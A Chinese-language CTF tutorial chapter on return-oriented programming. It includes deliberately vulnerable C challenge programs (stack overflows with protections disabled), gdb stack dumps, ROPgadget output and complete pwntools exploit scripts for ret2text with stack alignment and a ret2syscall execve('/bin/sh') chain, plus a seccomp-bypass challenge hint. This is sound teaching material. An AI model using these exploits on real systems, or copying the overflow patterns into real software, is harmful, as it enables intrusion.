# 1.3.2 简单的 ROP 链

在上一节的的例子中，gift 函数中有这样一句内联汇编 `asm("pop %rax")`，这里我们把它去掉试试：

### 例题 chp1-1-ret2text-revenge

这里给出源码如下：

```c
// compiled with: gcc -no-pie -fno-stack-protector ./ret2text-rev.c -o ./ret2text-rev
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void gift() {
    system("/bin/sh");
}
int main() {
    char buf[0x20];
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

>   因为程序 io 交互等都没有改，直接运行之前的 exp 同样是可以通过栈溢出劫持 rip 到 gift 函数中的，但是实际运行后发现并没有成功 getshell，读者不妨自己调试一下找找原因。

运行之前的 exp 并来到 gdb 中进行调试，可以发现程序确实是来到了 gift 函数中，但是继续运行时卡在了这一句上面：

```sh
0x7f47d8a06e3c <do_system+364>    movaps xmmword ptr [rsp + 0x50], xmm0
```

实际上这句汇编语句是用于检查栈是否对齐的，即 rsp+0x50 是否 0x10 对齐，可以看到当前 rsp 十六进制下末位是 8，即栈没对齐：

```sh
00:0000│ rsp   0x7ffdee8dd548 —▸ 0x7f47d8ac2fd2 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
01:0008│ rdi-4 0x7ffdee8dd550 ◂— 0xffffffff
02:0010│       0x7ffdee8dd558 —▸ 0x7ffdee8dd8c0 —▸ 0x4011d0 (__libc_csu_init) ◂— endbr64
03:0018│       0x7ffdee8dd560 —▸ 0x402004 ◂— 0x68732f6e69622f /* '/bin/sh' */
04:0020│       0x7ffdee8dd568 ◂— 0x14
05:0028│       0x7ffdee8dd570 ◂— 0x7c /* '|' */
06:0030│       0x7ffdee8dd578 ◂— 0x0
07:0038│       0x7ffdee8dd580 —▸ 0x7f47d8bf59e8 (_rtld_global+2440)
```

故无法通过这句检查，程序报错退出，这时读者不难猜到，gift 函数中额外加的那句内联汇编是用来调整使栈对齐的。

但是作为攻击者，难道这是候就束手无措了吗？答案当然是否定的，这时候就要引出 ROP 链（rop chain）的思路了：

本章开始介绍 rop 时曾提到过 gadgets 的概念，即借助程序中现有的小片段来实现程序执行流程的控制，至于这些 gadgets 的获取，有几种思路：

-   gadgets 的目标是控制寄存器值或者调整栈结构
    -   即 gadgets 会包含 pop 等语句来控制寄存器值
-   gadgets 不能破坏我们 rop 链的执行流程
    -   即 gadgets 会以 ret 等语句来进行结尾

因此可以根据这些目标直接在 gdb / ida 中进行人工筛选。

当然这些繁琐的工作可以交给现有工具来进行：ropper 和 ROPgadget 都是很好的辅助工具，其中 ropper 适合对大型文件进行查找，而命令行下的 ROPgadget 则便于结合管道符和 shell 命令使用。

回到例题中，我们的目标是使栈对齐，故可以直接在栈上先放一个 `ret;` 语句，随后再跟上 gift 函数的地址：

第一步先找一个 ret 语句：

```sh
❯ ROPgadget --binary ./ret2text-rev --only "pop|ret" | grep ret
0x000000000040122c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040122e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401230 : pop r14 ; pop r15 ; ret
0x0000000000401232 : pop r15 ; ret
0x000000000040122b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040122f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401233 : pop rdi ; ret
0x0000000000401231 : pop rsi ; pop r15 ; ret
0x000000000040122d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
```

这里最后一个 0x000000000040101a 就符和要求，接下来把这句接到原本的 payload 上，构成 ROP 链：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ret_addr = 0x000000000040101a

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(ret_addr)
payload += p64(elf.symbols['gift'])
s(payload)

ia()
```

这是后运行到 main 函数退出时栈上情况如下：

```sh
pwndbg> stack
00:0000│ rsp 0x7ffd180320a8 —▸ 0x40101a (_init+26) ◂— ret
01:0008│     0x7ffd180320b0 —▸ 0x401176 (gift) ◂— endbr64
```

即先到 `ret;` 语句上，使栈实现对齐再 ret 到 gift 函数上，最终成功实现 getshell.

---

## ret2syscall

当然，rop 并不一定需要程序中存在现有的利用代码，接下来介绍 ret2syscall 的利用方法：

正如在章节 0.4 中介绍的那样，汇编语言提供了另一种不借助库函数而是直接利用中断来调用函数的方法，在 [amd64 架构下中断](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)就是 syscall，而中断号存放在 rax 中，具体可以查阅对应架构的中断向量表，下面以常见的几个 syscall 为例：

```sh
%rax	System call	%rdi	%rsi	%rdx	%r10	%r8	%r9
0	sys_read	unsigned int fd	char *buf	size_t count			
1	sys_write	unsigned int fd	const char *buf	size_t count			
2	sys_open	const char *filename	int flags	int mode
9	sys_mmap	unsigned long addr	unsigned long len	unsigned long prot	unsigned long flags	unsigned long fd	unsigned long off
10	sys_mprotect	unsigned long start	size_t len	unsigned long prot
40	sys_sendfile	int out_fd	int in_fd	off_t *offset	size_t count
59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
```

如我们想调用 sys_execve 来实现 getshell 时，就需要使 rdi 为指向字符串 b"/bin/sh\x00" 的指针，rsi 和 rdx 为 0 即可，最后使 rax 为 59，最后执行 syscall 就能获得 shell.

### 例题 chp1-1-ret2text-revenge-revenge

这时候在上面的例题中去掉了 gift 函数并且采用静态编译，源码如下：

```c
// compiled with: gcc -static -no-pie -fno-stack-protector ./ret2text-rev-rev.c -o ./ret2text-rev-rev
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    char buf[0x20];
    puts("/bin/sh");
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

这时候再用 ROPgadget 来搜索 gadgets 就能发现查找速度慢了很多，这是因为静态编译使得程序中 gadgets 数量更多了，这对于 ROP 利用来说是好事，因为我们可以找到更多的有用 gadgets 了.

来看一下现有条件：

-   静态编译的程序，给我们带来了很多 gadgets（如 `syscall;ret`）
-   溢出长度多达 0x100-0x20，这意味着我们可以布置很长的 rop 链
-   没有地址随机化，所以 gadgets 的地址都是固定的，用工具找到后直接拿来用就行

于是根据上面的思路构造出如下 rop 链：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

syscall_ret = 0x0000000000416c44
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f15e
pop_rdx_ret = 0x000000000040176f
pop_rax_ret = 0x0000000000414df4
str_bin_sh  = next(elf.search(b"/bin/sh\x00"))

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(pop_rdi_ret) + p64(str_bin_sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall_ret)
s(payload)

ia()
```

读者不妨试试自己构造上面的 rop 链，下面留给读者一个问题和一个挑战：

>   实际上源程序中本来是没有字符串 "/bin/sh\x00" 的，这个字符串可以放在栈里吗？如果放在栈里那需要对 exp 做出什么样的改变？

---

### 挑战：例题 chp1-1-ret2text-revenge-revenge-revenge

上面利用 `execve("/bin/sh", 0, 0)` 的方式实现了 getshell，那如果题目中通过 seccomp 来禁用了 evecve 的系统调用呢？我们是否还有办法获取 flag？

```c
// compiled with: gcc -static -no-pie -fno-stack-protector ./ret2text-rev-rev-rev.c -o ./ret2text-rev-rev-rev -lseccomp
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <seccomp.h>
#include <linux/seccomp.h>

int main() {
    char buf[0x20];
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    seccomp_load(ctx);
    puts("/bin/sh");
    puts("flag is at: ");
    puts("/flag");
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

答案当然是肯定的，这里给读者一个小提示：orw 或者 open + sendfile，这里就不放 exp 了，留作挑战，读者可以在附件中找到利用代码。

---
